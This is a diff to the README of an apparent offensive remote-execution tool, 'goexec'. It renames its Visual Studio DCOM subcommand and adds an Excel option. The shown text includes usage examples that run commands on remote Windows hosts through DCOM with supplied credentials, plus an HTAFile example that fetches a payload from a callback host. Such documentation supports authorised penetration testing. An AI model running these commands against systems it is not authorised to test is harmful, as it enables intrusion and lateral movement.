@@ -208,7 +208,8 @@ Available Commands:
   shellwindows       Execute with the ShellWindows DCOM object
   shellbrowserwindow Execute with the ShellBrowserWindow DCOM object
   htafile            Execute with the HTAFile DCOM object
-  vs-dte             Execute with the VisualStudio.DTE object
+  excel              Execute with DCOM object(s) targeting Microsoft Excel
+  visualstudio       Execute with DCOM object(s) targeting Microsoft Visual Studio
 
 ... [inherited flags] ...
 
@@ -382,19 +383,19 @@ goexec dcom htafile "$target" \
   --url "http://callback.lan/payload.hta"
 ```
 
-#### Visual Studio `ExecuteCommand` Method (`dcom vs-dte`)
+#### Visual Studio `ExecuteCommand` Method (`dcom visualstudio dte`)
 
-The `vs-dte` method uses the exposed `VisualStudio.DTE` object to spawn a process via the `ExecuteCommand` method.
+The `visualstudio dte` method uses the exposed `VisualStudio.DTE` object to spawn a process via the `ExecuteCommand` method.
 This method requires that the remote host has Microsoft Visual Studio installed.
 
 ```text
 Usage:
-  goexec dcom vs-dte [target] [flags]
+  goexec dcom visualstudio dte [target] [flags]
 
 Visual Studio:
+      --vs-2019             Target Visual Studio 2019
       --vs-command string   Visual Studio DTE command to execute
       --vs-args string      Visual Studio DTE command arguments
-      --vs-2019             Target Visual Studio 2019
 
 Execution:
   -e, --exec executable        Remote Windows executable to invoke
@@ -410,13 +411,13 @@ Execution:
 
 ```shell
 # Execute `sc query` (batch) + save output to services.txt
-goexec dcom vs-dte "$target" \
+goexec dcom visualstudio dte "$target" \
   --user "${auth_user}@${domain}" \
   --password "$auth_pass" \
   --command 'sc query' -o services.txt
 
 # Execute `cmd.exe /c set` with output, target Visual Studio 2019
-goexec dcom vs-dte "$target" \
+goexec dcom visualstudio dte "$target" \
   --user "${auth_user}@${domain}" \
   --password "$auth_pass" \
   --vs-2019 \
